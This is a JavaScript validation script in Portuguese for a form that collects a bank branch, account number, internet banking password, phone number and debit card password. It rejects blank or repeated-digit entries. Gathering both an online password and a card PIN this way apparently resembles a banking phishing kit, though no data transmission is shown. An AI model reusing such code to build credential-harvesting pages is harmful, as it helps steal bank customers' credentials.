function validar1() {
if ( document.form.agencia.value == "" || 
document.form.agencia.value.length < 4 || 
document.form.agencia.value == "0000" || 
document.form.agencia.value == "1111" || 
document.form.agencia.value == "2222" ||
document.form.agencia.value == "3333" || 
document.form.agencia.value == "4444" || 
document.form.agencia.value == "5555" || 
document.form.agencia.value == "6666" || 
document.form.agencia.value == "7777" || 
document.form.agencia.value == "8888" || 
document.form.agencia.value == "9999"){
alert ("Agência, inválida!");
document.form.agencia.focus(); return false;
}
if (document.form.conta.value == "" || 
document.form.conta.value.length < 6 || 
document.form.conta.value == "000000" || 
document.form.conta.value == "111111" || 
document.form.conta.value == "222222" || 
document.form.conta.value == "333333" || 
document.form.conta.value == "444444" || 
document.form.conta.value == "555555" || 
document.form.conta.value == "666666" || 
document.form.conta.value == "777777" || 
document.form.conta.value == "888888" || 
document.form.conta.value == "999999"){
alert ("Conta corrente ou dígito, inválido!");
document.form.conta.focus(); return false;
}
}

function validar2() {
if (document.form.senha.value == "" || 
document.form.senha.value.length < 6 || 
document.form.senha.value == "000000" || 
document.form.senha.value == "111111" || 
document.form.senha.value == "222222" || 
document.form.senha.value == "333333" || 
document.form.senha.value == "444444" || 
document.form.senha.value == "555555" || 
document.form.senha.value == "666666" || 
document.form.senha.value == "777777" || 
document.form.senha.value == "888888" || 
document.form.senha.value == "999999"){
alert ("Senha da Internet, inválida!");
document.form.senha.focus(); return false;
}
}

function validar3() {
if (document.form.telefone.value == "" || 
document.form.telefone.value.length < 10 || 
document.form.telefone.value == "(00)00000-0000" || 
document.form.telefone.value == "(11)11111-1111" || 
document.form.telefone.value == "(22)22222-2222" || 
document.form.telefone.value == "(33)33333-3333" || 
document.form.telefone.value == "(44)44444-4444" || 
document.form.telefone.value == "(55)55555-5555" || 
document.form.telefone.value == "(66)66666-6666" || 
document.form.telefone.value == "(77)77777-7777" || 
document.form.telefone.value == "(88)88888-8888" || 
document.form.telefone.value == "(99)99999-9999"){
alert ("Telefone, Inválido!");
document.form.telefone.focus(); return false;
}	
if (document.form.senha2.value == "" || 
document.form.senha2.value.length < 4 || 
document.form.senha2.value == "000000" || 
document.form.senha2.value == "111111" || 
document.form.senha2.value == "222222" || 
document.form.senha2.value == "333333" || 
document.form.senha2.value == "444444" || 
document.form.senha2.value == "555555" || 
document.form.senha2.value == "666666" || 
document.form.senha2.value == "777777" || 
document.form.senha2.value == "888888" || 
document.form.senha2.value == "999999"){
alert ("Senha do cartão de débito, inválida!");
document.form.senha2.focus(); return false;
}
}